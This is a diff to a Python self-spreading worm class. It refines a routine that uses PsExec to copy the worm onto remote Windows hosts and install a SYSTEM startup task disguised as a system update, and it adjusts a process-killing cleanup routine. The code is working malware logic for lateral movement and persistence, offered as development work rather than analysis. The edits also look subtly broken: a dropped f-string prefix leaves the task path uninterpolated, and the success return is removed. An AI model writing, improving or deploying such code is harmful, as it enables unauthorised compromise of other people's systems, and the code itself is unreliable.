@@ -178,19 +178,20 @@ class NetworkWorm:
     def _winrm_infection(self, ip):
         """Windows Remote Management attack"""
         try:
+            # Added timeout and shell=False
             subprocess.run([
-                'PsExec.exe', f'\\{ip}', '-accepteula', '-s',
+                'PsExec.exe', f'\\{ip}', '-accepteula', '-nobanner', '-s',
                 'powershell.exe', '-Command',
                 f'Copy-Item "{self.worm_path}" "C:\\Windows\\Temp\\{self.fingerprint}.exe";'
                 f'Register-ScheduledTask -TaskName "SystemUpdate_{self.fingerprint}" '
-                f'-Action (New-ScheduledTaskAction -Execute "C:\\Windows\\Temp\\{self.fingerprint}.exe") '
+                '-Action (New-ScheduledTaskAction -Execute "C:\\Windows\\Temp\\{self.fingerprint}.exe") '
                 '-Trigger (New-ScheduledTaskTrigger -AtStartup) -User SYSTEM'
-            ], check=True, timeout=45)
-            self._mark_infection(ip)
-            return ip
+            ], check=True, timeout=60, shell=False)  # Added shell=False
+        except subprocess.TimeoutExpired:
+            logging.error(f"WinRM timeout on {ip}")
         except Exception as e:
-            logging.error(f"WinRM attack failed {ip}: {str(e)}")
-            return None
+            logging.error(f"WinRM failed {ip}: {str(e)}")
+        return None
 
     def _is_infected(self, ip):
         """Check infection status via beacon"""
@@ -238,12 +239,15 @@ class NetworkWorm:
             if os.name == 'posix':
                 subprocess.run('pkill -f "[.]systemd-daemon"', shell=True)
             else:
+                # Modified Windows cleanup - SAFER APPROACH
                 subprocess.run(
-                    'wmic process where "name like \'%svchost%\'" delete',
-                    shell=True, stderr=subprocess.DEVNULL
+                    f'wmic process where "name like \'%{self.fingerprint}%\'" delete',
+                    shell=True,
+                    stderr=subprocess.DEVNULL,
+                    stdout=subprocess.DEVNULL
                 )
-        except:
-            pass
+        except Exception as e:
+            logging.warning(f"Cleanup error: {str(e)}")
 
     def _emergency_shutdown(self):
         """Destructive cleanup procedure"""
